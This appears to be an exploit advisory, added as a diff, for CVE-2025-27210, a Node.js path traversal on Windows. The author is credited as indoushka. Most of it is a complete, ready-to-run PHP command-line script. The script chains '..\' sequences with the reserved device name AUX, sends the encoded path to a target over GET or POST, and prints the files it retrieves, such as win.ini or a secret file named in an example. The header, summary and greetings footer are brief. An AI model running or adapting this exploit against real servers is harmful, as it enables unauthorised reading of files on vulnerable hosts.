@@ -1,0 +1,215 @@
+=============================================================================================================================================
+| # Title     : NodeJS 24.x Precise Windows Path Traversal via Reserved Device Names                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://nodejs.org/download/release/latest-v24.x/                                                                           |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207136/ &  	CVE-2025-27210
+
+[+] Summary    : This Proof of Concept demonstrates a precise Path Traversal vulnerability affecting Node.js applications running on Windows. 
+                 The issue arises from improper handling of Windows reserved device names (such as AUX) when combined with deep traversal sequences (..\\). 
+                 By abusing normalization logic in functions like path.normalize() or path.join(), an attacker can bypass intended directory restrictions and access arbitrary files on the filesystem. 
+                 The PoC supports both GET and POST methods, performs careful URL encoding, and validates successful exploitation by inspecting retrieved file contents (e.g., win.ini). 
+                 This vulnerability highlights the risks of platform-specific path semantics and underscores the need for strict, canonical path validation on Windows environments..
+
+[+] PoC : 
+
+<?php
+
+/**
+ * Usage: php poc.php -t http://target -f C:\\Windows\\win.ini -m GET
+ */
+
+class PathTraversalExploit {
+    
+    /**
+     * استغلال ثغرة المسار الدقيق
+     */
+    public function exploitPathTraversalPrecise($targetUrl, $targetFile, $method) {
+        $traverseSequence = str_repeat("..\\", 6);
+        $normalizedTargetFile = preg_replace('/^C:/', '', $targetFile);
+        $normalizedTargetFile = ltrim($normalizedTargetFile, "\\/");
+        
+        $maliciousPath = $traverseSequence . "AUX\\..\\" . $normalizedTargetFile;
+        $encodedMaliciousPath = urlencode($maliciousPath);
+        $fullUrl = rtrim($targetUrl, '/') . '/' . $encodedMaliciousPath;
+        
+        $responseData = [
+            "target_url" => $targetUrl,
+            "target_file_attempted" => $targetFile,
+            "malicious_path_sent_raw" => $maliciousPath,
+            "malicious_path_sent_encoded" => $encodedMaliciousPath,
+            "full_request_url" => $fullUrl,
+            "http_method" => $method,
+            "success" => false,
+            "response_status_code" => null,
+            "response_content_length" => null,
+            "extracted_content" => null,
+            "error_message" => null
+        ];
+        
+        try {
+            echo "[*] Preparing precise Path Traversal exploit...\n";
+            echo "[*] Malicious Path (Encoded): $encodedMaliciousPath\n";
+            echo "[*] Request URL: $fullUrl\n";
+            
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+            curl_setopt($ch, CURLOPT_HEADER, false);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 PathTraversalExploit/1.0');
+            
+            if (strtoupper($method) === 'GET') {
+                curl_setopt($ch, CURLOPT_URL, $fullUrl);
+            } elseif (strtoupper($method) === 'POST') {
+                curl_setopt($ch, CURLOPT_URL, $targetUrl);
+                curl_setopt($ch, CURLOPT_POST, true);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, ['filename' => $encodedMaliciousPath]);
+            } else {
+                throw new Exception("Unsupported HTTP method. Use 'GET' or 'POST'.");
+            }
+            
+            $content = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $contentLength = strlen($content);
+            
+            $responseData["response_status_code"] = $httpCode;
+            $responseData["response_content_length"] = $contentLength;
+            
+            if ($httpCode == 200) {
+                $responseData["extracted_content"] = $content;
+                
+                if (stripos($targetFile, "win.ini") !== false && stripos($content, "[windows]") !== false) {
+                    $responseData["success"] = true;
+                } elseif (!empty($content)) {
+                    $responseData["success"] = true;
+                } else {
+                    $responseData["error_message"] = "Received 200 OK, but content is empty or unexpected.";
+                }
+            } else {
+                $responseData["error_message"] = "Server responded with non-200 status code: $httpCode";
+            }
+            
+            curl_close($ch);
+            
+        } catch (Exception $e) {
+            $responseData["error_message"] = "An unexpected error occurred: " . $e->getMessage();
+        }
+        
+        return $responseData;
+    }
+    
+    /**
+     * عرض المساعدة
+     */
+    public function showHelp() {
+        echo "\n" . str_repeat("=", 70) . "\n";
+        echo "      CVE-2025-27210 Node.js Path Traversal Exploit PoC - PHP Version\n";
+        echo str_repeat("=", 70) . "\n";
+        echo "Usage: php " . basename(__FILE__) . " [options]\n\n";
+        echo "Options:\n";
+        echo "  -t, --target    Base URL of the vulnerable Node.js application endpoint\n";
+        echo "                  (e.g., http://localhost:3000/files)\n";
+        echo "  -f, --file      Absolute path to the target file on Windows system\n";
+        echo "                  Default: C:\\Windows\\win.ini\n";
+        echo "  -m, --method    HTTP method for request (GET or POST)\n";
+        echo "                  Default: GET\n";
+        echo "  -h, --help      Show this help message\n\n";
+        echo "Examples:\n";
+        echo "  php " . basename(__FILE__) . " -t http://localhost:3000/files -f C:\\Windows\\win.ini\n";
+        echo "  php " . basename(__FILE__) . " -t http://target/files -f C:\\secret.txt -m POST\n";
+        echo str_repeat("=", 70) . "\n\n";
+    }
+    
+    /**
+     * الرئيسية
+     */
+    public function main($argv) {
+        $shortOpts = "t:f:m:h";
+        $longOpts = [
+            "target:",
+            "file:",
+            "method:",
+            "help"
+        ];
+        
+        $options = getopt($shortOpts, $longOpts);
+        
+        // عرض المساعدة إذا طلب
+        if (isset($options['h']) || isset($options['help'])) {
+            $this->showHelp();
+            exit(0);
+        }
+        
+        // التحقق من المعاملات المطلوبة
+        if (!isset($options['t']) && !isset($options['target'])) {
+            echo "Error: Target URL is required!\n";
+            $this->showHelp();
+            exit(1);
+        }
+        
+        $target = $options['t'] ?? $options['target'] ?? null;
+        $file = $options['f'] ?? $options['file'] ?? "C:\\Windows\\win.ini";
+        $method = $options['m'] ?? $options['method'] ?? "GET";
+        
+        echo "\n" . str_repeat("=", 70) . "\n";
+        echo "      CVE-2025-27210 Node.js Path Traversal Exploit PoC - PHP Version\n";
+        echo str_repeat("=", 70) . "\n";
+        echo "[*] Target URL: $target\n";
+        echo "[*] Target File: $file\n";
+        echo "[*] HTTP Method: $method\n";
+        echo str_repeat("-", 70) . "\n\n";
+        
+        $result = $this->exploitPathTraversalPrecise($target, $file, $method);
+        
+        echo "\n" . str_repeat("-", 70) . "\n";
+        echo "                   Exploit Results\n";
+        echo str_repeat("-", 70) . "\n";
+        echo "  Request URL: " . $result['full_request_url'] . "\n";
+        echo "  Malicious Path Sent (Raw): " . $result['malicious_path_sent_raw'] . "\n";
+        echo "  Malicious Path Sent (Encoded): " . $result['malicious_path_sent_encoded'] . "\n";
+        echo "  Response Status Code: " . $result['response_status_code'] . "\n";
+        echo "  Response Content Length: " . $result['response_content_length'] . " bytes\n";
+        
+        if ($result["success"]) {
+            echo "\n  [+] File successfully retrieved! Content below:\n";
+            echo "  " . str_repeat("=", 66) . "\n";
+            echo $result["extracted_content"];
+            echo "\n  " . str_repeat("=", 66) . "\n";
+        } else {
+            echo "\n  [-] File retrieval failed or unexpected content received.\n";
+            if ($result["error_message"]) {
+                echo "  Error: " . $result['error_message'] . "\n";
+            } elseif ($result["extracted_content"]) {
+                echo "\n  Response content (partial, may indicate server error or unexpected data):\n";
+                echo "  " . str_repeat("-", 66) . "\n";
+                $content = $result["extracted_content"];
+                if (strlen($content) > 1000) {
+                    echo substr($content, 0, 1000) . "...\n";
+                } else {
+                    echo $content . "\n";
+                }
+                echo "  " . str_repeat("-", 66) . "\n";
+            }
+        }
+        
+        echo "\n" . str_repeat("=", 70) . "\n";
+        echo "                 Complete\n";
+        echo str_repeat("=", 70) . "\n\n";
+    }
+}
+
+// تنفيذ البرنامج
+if (PHP_SAPI === 'cli') {
+    $exploit = new PathTraversalExploit();
+    $exploit->main($argv);
+} else {
+    echo "This script must be run from command line (CLI).\n";
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
